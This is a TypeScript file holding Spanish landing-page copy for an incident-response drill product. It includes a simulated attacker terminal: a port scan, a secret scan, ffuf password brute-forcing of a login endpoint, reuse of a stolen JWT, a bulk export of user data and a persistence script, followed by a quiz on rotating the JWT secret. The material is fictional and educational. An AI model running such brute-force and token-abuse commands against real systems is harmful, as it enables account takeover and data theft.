/**
 * Copy y datos de la landing. Datos de ataque ficticios pero verosímiles (DESIGN.md › Voz y copy):
 * IPs de documentación (203.0.113.0/24, 198.51.100.0/24), keys y tokens truncados.
 * La historia es la cadena "Creí que lo había resuelto" de Apuntes (docs/victim/ANSWER_KEY.md).
 */

export const HERO = {
  title: "Ensaya el hackeo antes de que pase",
  scrollHint: "BAJA PARA EMPEZAR",
  project: "apuntes.dev",
};

export interface LogRow {
  time: string;
  method: string;
  path: string;
  status: string;
  /** Lo que va al final de la fila: latencia, email o IP. */
  meta: string;
  /** hit = la fila donde "pega" el ataque. */
  hit?: boolean;
}

/** Mitad cian: tu proyecto, un martes cualquiera. */
export const CALM = {
  chip: "Tú",
  caption: "Tu app, un martes cualquiera.",
  hud: [
    { label: "Alertas", value: "0", tone: "defense" as const },
    { label: "Deploy", value: "OK", tone: "defense" as const },
    { label: "p95", value: "42 ms", optional: true },
  ],
  status: "deploy OK · 0 alertas · todo en orden",
  rows: [
    { time: "03:12:04", method: "GET", path: "/notes", status: "200", meta: "18 ms" },
    { time: "03:12:05", method: "POST", path: "/notes", status: "201", meta: "31 ms" },
    { time: "03:12:07", method: "GET", path: "/notes/42", status: "200", meta: "12 ms" },
    { time: "03:12:09", method: "GET", path: "/api/notes?q=tren", status: "200", meta: "22 ms" },
    { time: "03:12:12", method: "POST", path: "/api/auth/login", status: "200", meta: "64 ms" },
    { time: "03:12:15", method: "GET", path: "/", status: "200", meta: "9 ms" },
    { time: "03:12:18", method: "PUT", path: "/api/notes/42", status: "200", meta: "27 ms" },
    { time: "03:12:21", method: "GET", path: "/profile", status: "200", meta: "14 ms" },
  ] satisfies LogRow[],
};

/** Mitad ámbar: el mismo proyecto, visto desde el atacante. */
export const UNDER_ATTACK = {
  chip: "El atacante",
  caption: "La misma app, vista desde afuera.",
  loginAttemptsStart: 1204,
  hud: [
    { label: "Intentos de login", tone: "attack" as const },
    { label: "Alertas", value: "37", tone: "attack" as const },
    { label: "p95", value: "1,8 s", optional: true },
  ],
  status: "admin@apuntes.dev: acceso",
  rows: [
    { time: "03:12:04", method: "POST", path: "/api/auth/login", status: "401", meta: "203.0.113.42" },
    { time: "03:12:04", method: "POST", path: "/api/auth/login", status: "401", meta: "203.0.113.42" },
    { time: "03:12:05", method: "POST", path: "/api/auth/login", status: "401", meta: "198.51.100.7" },
    { time: "03:12:05", method: "POST", path: "/api/auth/login", status: "401", meta: "203.0.113.42" },
    { time: "03:12:06", method: "POST", path: "/api/auth/login", status: "200", meta: "admin@apuntes.dev", hit: true },
    { time: "03:12:07", method: "GET", path: "/api/users/me", status: "200", meta: "role=admin", hit: true },
    { time: "03:12:09", method: "GET", path: "/api/admin/users/export", status: "200", meta: "2,1 MB", hit: true },
    { time: "03:12:11", method: "POST", path: "/api/auth/login", status: "401", meta: "198.51.100.7" },
  ] satisfies LogRow[],
};

/** AttackTerminal: el código del ataque, corriendo infinito detrás de la pregunta. */
export const ATTACK_SCRIPT: { text: string; kind?: "hit" | "ok" }[] = [
  { text: "$ nmap -sV -p 80,443,5432 apuntes.dev" },
  { text: "PORT      STATE     SERVICE     VERSION", kind: "ok" },
  { text: "443/tcp   open      https       Express 5.1 (Node 22)", kind: "ok" },
  { text: "5432/tcp  filtered  postgresql", kind: "ok" },
  { text: "$ curl -s https://apuntes.dev/api/health" },
  { text: '{"status":"ok","db":"up","version":"1.8.2"}', kind: "ok" },
  { text: "$ git clone https://github.com/apuntes-dev/apuntes && cd apuntes" },
  { text: "$ trufflehog filesystem . --only-verified" },
  { text: "found 0 verified secrets · 2 unverified (docker-compose.yml, .env.example)", kind: "ok" },
  { text: "$ grep -rn \"expiresIn\" src/" },
  { text: "src/config.ts:14:  JWT_EXPIRES_IN: '30d',", kind: "hit" },
  { text: "$ ffuf -w top-10k.txt -X POST -u https://apuntes.dev/api/auth/login \\" },
  { text: "    -d '{\"email\":\"admin@apuntes.dev\",\"password\":\"FUZZ\"}' -mc 200" },
  { text: "[401] 123456                 · 38 ms", kind: "ok" },
  { text: "[401] apuntes2025            · 41 ms", kind: "ok" },
  { text: "[401] admin123               · 37 ms", kind: "ok" },
  { text: "[401] Santiago2026           · 40 ms", kind: "ok" },
  { text: ":: Progress: [1204/10000] :: 92 req/sec :: Errors: 0 ::", kind: "ok" },
  { text: "[200] Primavera2025!         · 64 ms", kind: "hit" },
  { text: "$ export TOKEN=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOjEsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc…" },
  { text: "$ curl -s -H \"Authorization: Bearer $TOKEN\" https://apuntes.dev/api/users/me" },
  { text: '{"id":1,"email":"admin@apuntes.dev","role":"admin"}', kind: "hit" },
  { text: "$ curl -s -H \"Authorization: Bearer $TOKEN\" \\" },
  { text: "    https://apuntes.dev/api/admin/users/export -o users.json" },
  { text: "  % Total    % Received   Time    Speed", kind: "ok" },
  { text: "100  2.1M  100  2.1M      0:00:01  4.2M", kind: "ok" },
  { text: "$ jq 'length' users.json" },
  { text: "3812", kind: "hit" },
  { text: "# 03:41 — la víctima cambia la contraseña del admin" },
  { text: "$ curl -s -o /dev/null -w '%{http_code}\\n' -H \"Authorization: Bearer $TOKEN\" \\" },
  { text: "    https://apuntes.dev/api/admin/users" },
  { text: "200   # el token sigue vivo", kind: "hit" },
  { text: "$ jwt decode $TOKEN | jq '{iat, exp}'" },
  { text: '{ "iat": "03:12:44", "exp": "+30d" }', kind: "ok" },
  { text: "$ curl -s -H \"Authorization: Bearer $TOKEN\" https://apuntes.dev/api/notes?q=transferencia" },
  { text: '[{"id":17,"title":"Datos para transferencias","user_id":2}]', kind: "hit" },
  { text: "$ sleep 300 && ./persist.sh --token $TOKEN" },
];

export type OptionId = "A" | "B" | "C";

export const QUESTION = {
  label: "INCIDENTE · APUNTES",
  title: "El atacante sigue entrando.",
  context:
    "Te hackearon el login de Apuntes, tu app de notas. Ya le cambiaste la contraseña al admin, pero en los logs su sesión sigue activa. ¿Qué haces?",
  code: [
    { time: "03:41:08", text: "password_changed  user=admin@apuntes.dev" },
    { time: "03:47:12", text: "GET /api/admin/users  200  ", mark: "token_iat=03:12:44" },
  ],
  options: [
    {
      id: "A" as OptionId,
      label: "Cambiar la contraseña otra vez, ahora de 24 caracteres y con 2FA",
      verdict: "No alcanza",
      correct: false,
      explanation:
        "No alcanza: el atacante ya no usa la contraseña, usa un JWT firmado antes del cambio. Solo rotar el JWT_SECRET lo invalida.",
    },
    {
      id: "B" as OptionId,
      label: "Rotar el JWT_SECRET y hacer el redeploy",
      verdict: "Correcto",
      correct: true,
      explanation:
        "Correcto: el atacante entraba con un JWT firmado antes del cambio. Con un JWT_SECRET nuevo, todos los tokens viejos reciben 401.",
    },
    {
      id: "C" as OptionId,
      label: "Bloquear la IP del atacante en el firewall",
      verdict: "Lo esquiva",
      correct: false,
      explanation:
        "Lo esquiva: cambia de IP en segundos y sigue entrando con el mismo JWT. Solo rotar el JWT_SECRET invalida ese token.",
    },
  ],
};

export const RESULT = {
  ok: {
    verdict: "Bien ahí.",
    chip: "Contenido",
    why: "El atacante no necesitaba la contraseña: tenía un JWT firmado antes del cambio, válido por 30 días. Al rotar el JWT_SECRET, ese token deja de valer y queda afuera.",
  },
  fail: {
    verdict: "Te hackearon.",
    chip: "Sigue adentro",
    why: {
      A: "Una contraseña más fuerte no sirve si el atacante ya no la necesita: entra con un JWT firmado antes del cambio, válido por 30 días. Solo rotar el JWT_SECRET invalida ese token y lo saca.",
      C: "Bloquear la IP lo frena unos segundos: cambia de IP y sigue entrando con el mismo JWT, válido por 30 días. Solo rotar el JWT_SECRET invalida ese token y lo saca.",
    } as Record<string, string>,
  },
  invite: "¿Sabes qué vectores tiene tu propio proyecto y cómo reaccionarías tú?",
  inviteCta: "Haz un simulacro con tu repo.",
  disclaimer:
    "Mayday es un simulacro: nunca tocamos tu producción. Leemos tu repo en modo solo lectura, lo atacamos en una copia aislada que se borra al terminar, y nunca te pedimos claves ni credenciales.",
  ctaTitle: "Haz el simulacro con tu repo",
  ctaLine: "Encontramos los vectores de tu proyecto, lo atacamos en una copia aislada y tú respondes contra el reloj.",
  ctaButton: "Entra con GitHub",
  /** No hay login con GitHub en la repo todavía: ruta placeholder. */
  ctaHref: "/login",
};
